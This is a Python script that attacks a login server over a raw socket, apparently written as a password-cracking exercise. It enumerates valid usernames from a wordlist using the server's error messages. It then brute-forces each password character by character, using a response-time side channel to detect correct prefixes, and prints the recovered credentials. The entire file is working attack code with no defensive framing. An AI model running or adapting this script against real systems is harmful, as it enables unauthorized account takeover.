import sys
import socket
import json
import time

hostname = sys.argv[1]
port = int(sys.argv[2])
logins = open("logins.txt").read().splitlines()
numbers_and_letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
numbers_and_letters = list(i for i in numbers_and_letters)


def attack_server():
    log_pass_dict = {"login": " ", "password": " "}
    for item in logins:
        log_pass_dict["login"] = item
        message = json.dumps(log_pass_dict)
        client_socket.send(message.encode())
        response = client_socket.recv(1024)
        response_decoded = response.decode()
        if "Wrong password!" in response_decoded:
            log_pass_dict["password"] = ""
            is_connected = False
            while not is_connected:
                for symbol in numbers_and_letters:
                    temp_log_pass_dict = {'login': log_pass_dict['login'],
                                          'password': log_pass_dict['password'] + symbol}
                    message = json.dumps(temp_log_pass_dict)
                    client_socket.send(message.encode())
                    sent_time = time.perf_counter()
                    response = client_socket.recv(1024)
                    received_time = time.perf_counter()
                    response_decoded = response.decode()
                    time_difference = received_time - sent_time
                    if time_difference >= 0.1:
                        log_pass_dict['password'] = temp_log_pass_dict['password']
                    elif "Connection success!" in response_decoded:
                        log_pass_dict['password'] = temp_log_pass_dict['password']
                        print(json.dumps(log_pass_dict))
                        is_connected = True
                        break


client_socket = socket.socket()
address = (hostname, port)
try:
    client_socket.connect(address)
    attack_server()
except ConnectionError:
    pass
finally:
    client_socket.close()
